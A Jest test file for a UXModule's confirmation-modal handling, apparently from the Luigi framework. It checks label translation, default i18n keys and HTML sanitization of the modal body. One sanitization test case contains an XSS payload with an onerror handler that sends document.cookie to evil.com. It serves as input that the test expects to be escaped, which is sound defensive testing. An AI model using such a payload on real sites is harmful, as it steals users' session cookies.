import { UXModule } from '../../src/modules/ux-module';
import { DirtyStatusService } from '../../src/services/dirty-status.service';
import { serviceRegistry } from '../../src/services/service-registry';
import { EscapingHelpers } from '../../src/utilities/helpers/escaping-helpers';

describe('UXModule', () => {
  let luigiMock: any;
  let connectorMock: any;
  let dirtyStatusServiceMock: any;
  let containerElement: any;

  beforeEach(() => {
    connectorMock = {
      renderAlert: jest.fn(),
      renderConfirmationModal: jest.fn(),
      setDocumentTitle: jest.fn(),
      closeUserSettings: jest.fn(),
      collapseLeftSideNav: jest.fn(),
      showLoadingIndicator: jest.fn(),
      hideLoadingIndicator: jest.fn(),
      addBackdrop: jest.fn(),
      removeBackdrop: jest.fn()
    };
    luigiMock = {
      getConfigValue: jest.fn().mockReturnValue({}),
      configChanged: jest.fn(),
      i18n: jest.fn().mockReturnValue({ setCurrentLocale: jest.fn() }),
      routing: jest.fn().mockReturnValue({ addNodeParams: jest.fn() }),
      ux: jest.fn().mockReturnValue({ collapseLeftSideNav: jest.fn(), openUserSettings: jest.fn() }),
      navigation: jest.fn().mockReturnValue({ runTimeErrorHandler: jest.fn() }),
      getEngine: jest.fn().mockReturnValue({
        _connector: connectorMock,
        _ux: undefined,
        _ui: undefined
      })
    };
    dirtyStatusServiceMock = { readDirtyStatus: jest.fn().mockReturnValue(false) };
    jest.spyOn(serviceRegistry, 'get').mockImplementation((service: any) => {
      if (service === DirtyStatusService) return dirtyStatusServiceMock;
      return {} as any;
    });
    containerElement = document.createElement('div') as any;
    containerElement.notifyConfirmationModalClosed = jest.fn();
    UXModule.init(luigiMock);
  });

  describe('handleConfirmationModalRequest', () => {
    it('translates header/body/button labels', async () => {
      const i18n = { getTranslation: jest.fn((key: string) => `t(${key})`) };
      luigiMock.i18n.mockReturnValue(i18n);
      UXModule.handleConfirmationModalRequest(
        {
          header: 'h',
          body: 'Some body text',
          buttonConfirm: 'ok',
          buttonDismiss: 'cancel'
        },
        containerElement as any
      );
      const [translated] = connectorMock.renderConfirmationModal.mock.calls[0];
      expect(translated.header).toBe('t(h)');
      expect(translated.body).toBe('Some body text');
      expect(translated.buttonConfirm).toBe('t(ok)');
      expect(translated.buttonDismiss).toBe('t(cancel)');
    });

    it('falls back to default i18n keys when fields are omitted', () => {
      const i18n = { getTranslation: jest.fn((key: string) => key) };
      luigiMock.i18n.mockReturnValue(i18n);
      UXModule.handleConfirmationModalRequest({}, containerElement as any);
      const [translated] = connectorMock.renderConfirmationModal.mock.calls[0];
      expect(translated.header).toBe('luigi.confirmationModal.header');
      expect(translated.body).toBe('luigi.confirmationModal.body');
      expect(translated.buttonConfirm).toBe('luigi.button.confirm');
      expect(translated.buttonDismiss).toBe('luigi.button.dismiss');
    });

    it.each([
      {
        input: 'Are you sure <b>you want</b> to do this?',
        output: 'Are you sure <b>you want</b> to do this?'
      },
      {
        input: '<img src="https://example.com/logo.png" />',
        output: '&lt;img src=&quot;https://example.com/logo.png&quot; /&gt;'
      },
      {
        input: '<img src=x onerror="fetch(\'https://evil.com?\'+document.cookie)">',
        output: '&lt;img src=x onerror=&quot;fetch(&#39;https://evil.com?&#39;+document.cookie)&quot;&gt;'
      }
    ])('sanitizes body content', async (data) => {
      const sanitizeHtmlSpy = jest.spyOn(EscapingHelpers, 'sanatizeHtmlExceptTextFormatting');
      const i18n = { getTranslation: jest.fn((key: string) => `t(${key})`) };
      luigiMock.i18n.mockReturnValue(i18n);
      UXModule.handleConfirmationModalRequest({ body: data.input }, containerElement as any);
      const [translated] = connectorMock.renderConfirmationModal.mock.calls[0];
      expect(sanitizeHtmlSpy).toHaveBeenCalledWith(data.input);
      expect(translated.body).toBe(data.output);
    });
  });
});
